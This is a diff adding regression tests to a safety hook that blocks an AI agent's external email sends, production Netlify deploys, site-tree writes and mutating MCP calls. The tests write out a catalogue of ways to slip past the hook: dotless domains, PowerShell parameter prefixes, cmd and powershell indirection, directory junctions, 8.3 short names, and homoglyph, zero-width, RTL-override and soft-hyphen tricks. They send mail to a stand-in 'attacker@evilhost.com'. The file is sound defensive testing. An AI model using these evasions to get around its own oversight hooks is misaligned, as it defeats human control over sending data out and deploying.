@@ -607,6 +607,260 @@ def test_token_dir_is_gitignored():
     print("PASS test_token_dir_is_gitignored")
 
 
+# --------------------------------------------------------------------------
+# MATCHER HARDENING (2026-07-17) -- five detection-gap bypasses found by
+# adversarial review of the OVERRIDE-TOKEN work, all independent of any
+# token: each lets a real, functionally-equivalent malicious command evade
+# detection entirely, so NO override is ever even requested. Personally
+# reproduced against the live gate before this fix, each against a passing
+# control of the equivalent already-blocked form.
+# --------------------------------------------------------------------------
+
+def test_dotless_domain_email_blocks():
+    """GAP 1: EMAIL_RE required a dot in the domain, so `attacker@evilhost`
+    (no TLD) was invisible to Gate 1 entirely -- exit 0, zero override needed.
+    Proven live: attacker@evilhost -> exit 0; attacker@evilhost.com -> exit 2."""
+    rc, out, err = run_hook(send_payload("attacker@evilhost"))
+    assert rc == 2, "a dotless-domain external recipient must block, got %s (%s)" % (rc, err)
+    print("PASS test_dotless_domain_email_blocks")
+
+
+def test_dotted_domain_email_still_blocks():
+    """Regression control for GAP 1's fix -- the ordinary case must still block."""
+    rc, out, err = run_hook(send_payload("attacker@evilhost.com"))
+    assert rc == 2, "a normal external recipient must still block, got %s (%s)" % (rc, err)
+    print("PASS test_dotted_domain_email_still_blocks")
+
+
+def test_recipient_flag_prefix_blocks():
+    """GAP 2: RECIPIENT_FLAGS matched only the literal substrings -to/-cc/-bcc.
+    send-via-outlook.ps1's param block has only ONE parameter starting with
+    T ($To), so PowerShell's unambiguous-prefix binder resolves `-T` to `-To`
+    -- verified against a stand-in script with the identical param block.
+    `-T attacker@evilhost.com` reached exit 0 (unblocked) before this fix."""
+    cmd = 'powershell -File send-via-outlook.ps1 -T attacker@evilhost.com -Subject hi -Body hi'
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 2, "a -T prefix-bound external recipient must block, got %s (%s)" % (rc, err)
+    print("PASS test_recipient_flag_prefix_blocks")
+
+
+def test_netlify_cmd_indirection_blocks():
+    """GAP 3: NETLIFY_INVOKE_RE anchored to a command-boundary position, so
+    `cmd /c netlify deploy --prod` (netlify preceded by a space from `/c `,
+    not by ^/;/&/|/$() reached exit 0 (unblocked) before this fix."""
+    rc, out, err = run_hook(bash_payload("cmd /c netlify deploy --build --prod"))
+    assert rc == 2, "cmd /c netlify indirection must block, got %s (%s)" % (rc, err)
+    print("PASS test_netlify_cmd_indirection_blocks")
+
+
+def test_netlify_powershell_command_indirection_blocks():
+    """GAP 4: same anchor gap, quoted-string form -- `netlify` inside a
+    powershell -Command "..." string is preceded by a quote character, not
+    an anchor. Reached exit 0 (unblocked) before this fix."""
+    rc, out, err = run_hook(bash_payload('powershell -Command "netlify deploy --build --prod"'))
+    assert rc == 2, "powershell -Command netlify indirection must block, got %s (%s)" % (rc, err)
+    print("PASS test_netlify_powershell_command_indirection_blocks")
+
+
+def test_netlify_plain_still_blocks():
+    """Regression control for GAPs 3/4's fix -- the ordinary anchored case
+    (already covered elsewhere in this file) must still block."""
+    rc, out, err = run_hook(bash_payload(PROD_DEPLOY))
+    assert rc == 2, "a plain leading-token netlify deploy must still block, got %s (%s)" % (rc, err)
+    print("PASS test_netlify_plain_still_blocks")
+
+
+def test_netlify_mention_in_unrelated_command_now_blocks():
+    """De-anchoring GATE 2a is a deliberate breadth tradeoff, matching Gate
+    2b's already-accepted philosophy (documented in check_bash's own
+    comments): a command that merely QUOTES/echoes the phrase now also
+    trips the gate. A false positive costs a retry; the alternative is the
+    cmd/powershell indirection gap GAPs 3/4 just closed. This test locks in
+    the tradeoff as an intentional, known cost -- not a silent regression."""
+    rc, out, err = run_hook(bash_payload('echo "the docs explain netlify deploy --prod"'))
+    assert rc == 2, (
+        "quoting the phrase now also blocks -- this is the accepted breadth "
+        "tradeoff, got %s (%s)" % (rc, err)
+    )
+    print("PASS test_netlify_mention_in_unrelated_command_now_blocks")
+
+
+def test_site_write_via_junction_blocks():
+    """GAP 5: check_file_write matched only the LITERAL file_path string, so
+    a directory junction pointing INTO the site tree from an innocuous-
+    looking path (whose own path text never contains a site marker) evaded
+    detection. Resolving the real path (following junctions/symlinks)
+    before matching closes this."""
+    tmp = tempfile.mkdtemp(prefix="oag-junction-")
+    real_site = os.path.join(tmp, "actual-target", "website-canonical")
+    os.makedirs(real_site, exist_ok=True)
+    innocuous = os.path.join(tmp, "innocuous-name")
+    proc = subprocess.run(
+        ["cmd", "/c", "mklink", "/J", innocuous, os.path.join(tmp, "actual-target", "website-canonical")],
+        capture_output=True, text=True,
+    )
+    if proc.returncode != 0:
+        print("SKIP test_site_write_via_junction_blocks (junction creation unavailable: %s)"
+              % (proc.stderr or proc.stdout).strip())
+        return
+    file_through_junction = os.path.join(innocuous, "index.html")
+    assert "website-canonical" not in file_through_junction.replace("\\", "/").lower(), (
+        "test setup bug: the junction path must NOT itself contain the site marker"
+    )
+    rc, out, err = run_hook(write_payload(file_through_junction))
+    assert rc == 2, (
+        "a write reaching the site tree via a junction must block even though its "
+        "own path text names no site marker, got %s (%s)" % (rc, err)
+    )
+    print("PASS test_site_write_via_junction_blocks")
+
+
+def test_site_write_via_unrelated_symlink_still_allows():
+    """Regression control for GAP 5's fix -- a junction to an ordinary,
+    non-site directory must NOT be swept up by the realpath resolution."""
+    tmp = tempfile.mkdtemp(prefix="oag-junction-safe-")
+    real_other = os.path.join(tmp, "actual-target", "not-the-site")
+    os.makedirs(real_other, exist_ok=True)
+    innocuous = os.path.join(tmp, "innocuous-name-2")
+    proc = subprocess.run(
+        ["cmd", "/c", "mklink", "/J", innocuous, real_other],
+        capture_output=True, text=True,
+    )
+    if proc.returncode != 0:
+        print("SKIP test_site_write_via_unrelated_symlink_still_allows (junction creation unavailable)")
+        return
+    rc, out, err = run_hook(write_payload(os.path.join(innocuous, "notes.md")))
+    assert rc == 0, (
+        "a junction to a non-site directory must not block, got %s (%s)" % (rc, err)
+    )
+    print("PASS test_site_write_via_unrelated_symlink_still_allows")
+
+
+# --------------------------------------------------------------------------
+# ROUND 2 FIXES (2026-07-17) -- fullwidth-@ Unicode homoglyph and the
+# send-via-outlook.ps1 8.3 short-name alias, both found trying to break
+# Round 1's surviving fixes.
+# --------------------------------------------------------------------------
+
+def test_fullwidth_at_sign_email_blocks():
+    """A fullwidth Unicode '＠' is invisible to a literal ASCII '@' match --
+    EMAIL_RE.findall() returned nothing and Gate 1 never fired: exit 0, zero
+    override needed. NFKC normalization folds it to ASCII '@' before matching."""
+    rc, out, err = run_hook(send_payload(u"attacker＠evilhost.com"))
+    assert rc == 2, "a fullwidth-@ external recipient must block, got %s (%s)" % (rc, err)
+    print("PASS test_fullwidth_at_sign_email_blocks")
+
+
+def test_send_script_8dot3_shortname_blocks():
+    """send-via-outlook.ps1 has a standing, zero-setup Windows 8.3 short-name
+    alias (SEND-V~1.PS1, confirmed live via `dir /x`) that the plain substring
+    check never saw -- reached exit 0 before this fix."""
+    cmd = 'powershell -File SEND-V~1.PS1 -To attacker@evilhost.com -Subject hi -Body hi'
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 2, "the 8.3 short-name alias must block, got %s (%s)" % (rc, err)
+    print("PASS test_send_script_8dot3_shortname_blocks")
+
+
+def test_send_script_8dot3_shortname_internal_recipient_allows():
+    """Regression control -- the short-name alias with a purely internal
+    recipient must still pass, same as the long name would."""
+    cmd = 'powershell -File SEND-V~1.PS1 -To ggoldberg@oxfordra.net -Subject hi -Body hi'
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 0, "internal-only recipient via short name must not block, got %s (%s)" % (rc, err)
+    print("PASS test_send_script_8dot3_shortname_internal_recipient_allows")
+
+
+# --------------------------------------------------------------------------
+# ROUND 3 FIXES (2026-07-17) -- invisible Unicode characters (Cf/Mn) breaking
+# a word-boundary match after NFKC, and check_mcp's allow-by-default suffix
+# check. Both found trying to break Round 1+2's surviving fixes.
+# --------------------------------------------------------------------------
+
+def test_zero_width_space_in_netlify_blocks():
+    """A ZWSP (U+200B) inserted mid-word breaks `\\bnetlify\\b` after NFKC
+    alone (NFKC doesn't strip format characters) -- reached exit 0 before
+    this fix. Stripping Cf/Mn categories closes it."""
+    cmd = u"cmd /c net​lify deploy --build --prod"
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 2, "a ZWSP-split 'netlify' must still block, got %s (%s)" % (rc, err)
+    print("PASS test_zero_width_space_in_netlify_blocks")
+
+
+def test_zero_width_space_in_trigger_phrase_blocks():
+    """A ZWSP inside 'send-via-outlook.ps1' itself broke the Gate 1 TRIGGER
+    phrase, disabling the gate for that call entirely -- reached exit 0."""
+    cmd = u"powershell -File send-via-outlook​.ps1 -To attacker@evilhost.com -Subject hi -Body hi"
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 2, "a ZWSP-split trigger phrase must still block, got %s (%s)" % (rc, err)
+    print("PASS test_zero_width_space_in_trigger_phrase_blocks")
+
+
+def test_rtl_override_in_netlify_blocks():
+    """An RTL override character (U+202E) mid-word has the same effect as a
+    ZWSP -- breaks the word-boundary match invisibly."""
+    cmd = u"cmd /c net‮lify deploy --build --prod"
+    rc, out, err = run_hook(bash_payload(cmd))
+    assert rc == 2, "an RTL-override-split 'netlify' must still block, got %s (%s)" % (rc, err)
+    print("PASS test_rtl_override_in_netlify_blocks")
+
+
+def test_combining_mark_in_email_blocks():
+    """A combining low line (U+0332, category Mn) inserted in a recipient's
+    local-part has the same invisible-break effect as the Cf characters."""
+    rc, out, err = run_hook(send_payload(u"n̲etlifyattacker@evilhost.com"))
+    assert rc == 2, "a combining-mark-bearing recipient must still block, got %s (%s)" % (rc, err)
+    print("PASS test_combining_mark_in_email_blocks")
+
+
+def test_netlify_mcp_non_reader_non_updater_blocks():
+    """check_mcp was allow-by-default (gated only exact '-updater' suffix) --
+    a hypothetical mutating tool with any OTHER name evaded it entirely."""
+    rc, out, err = run_hook(mcp_payload("mcp__netlify__project-services-writer"))
+    assert rc == 2, "a non-reader netlify MCP tool must block by default, got %s (%s)" % (rc, err)
+    print("PASS test_netlify_mcp_non_reader_non_updater_blocks")
+
+
+def test_netlify_mcp_reader_still_allows():
+    """Regression control -- every real reader tool in the current connector
+    must still pass through ungated."""
+    for name in ("mcp__netlify__deploy-services-reader", "mcp__netlify__project-services-reader"):
+        rc, out, err = run_hook(mcp_payload(name))
+        assert rc == 0, "%s (a reader tool) must not block, got %s (%s)" % (name, rc, err)
+    print("PASS test_netlify_mcp_reader_still_allows")
+
+
+def test_stdin_decoded_as_utf8_not_platform_codepage():
+    """sys.stdin.encoding defaults to the PLATFORM codepage (cp1252 on this
+    Windows machine), not UTF-8. Reading a REAL multi-byte UTF-8 payload byte
+    (not Python's own ensure_ascii=True-escaped ASCII, which every other test
+    in this file relies on) through that decoder does not reliably raise -- it
+    SILENTLY MOJIBAKES: a UTF-8-encoded soft hyphen (2 bytes: 0xC2 0xAD)
+    decoded as cp1252 became TWO wrong characters, one of them a spurious
+    VISIBLE character that broke a `\\bnetlify\\b` match which should have
+    blocked. This bypasses this file's whole Round-3 Unicode hardening for any
+    invocation whose real payload contains literal (non-\\uXXXX-escaped)
+    non-ASCII bytes. Constructs the payload with ensure_ascii=False and writes
+    RAW UTF-8 bytes directly to the subprocess's stdin (bypassing run_hook's
+    normal ensure_ascii=True path, which never exercises this bug)."""
+    sessions_dir = fresh_sessions_dir()
+    payload = {
+        "tool_name": "Bash",
+        "tool_input": {"command": u"cmd /c net­lify deploy --build --prod"},
+        "session_id": SESSION_A,
+    }
+    raw_utf8 = json.dumps(payload, ensure_ascii=False).encode("utf-8")
+    env = dict(os.environ)
+    env["ORA_OVERRIDE_SESSIONS_DIR"] = sessions_dir
+    proc = subprocess.run(
+        [sys.executable, HOOK], input=raw_utf8, capture_output=True, env=env,
+    )
+    assert proc.returncode == 2, (
+        "a real UTF-8-encoded soft-hyphen-split 'netlify' must still block, got %s (%s)"
+        % (proc.returncode, proc.stderr)
+    )
+    print("PASS test_stdin_decoded_as_utf8_not_platform_codepage")
+
+
 if __name__ == "__main__":
     tests = [v for k, v in sorted(globals().items()) if k.startswith("test_") and callable(v)]
     for t in tests:
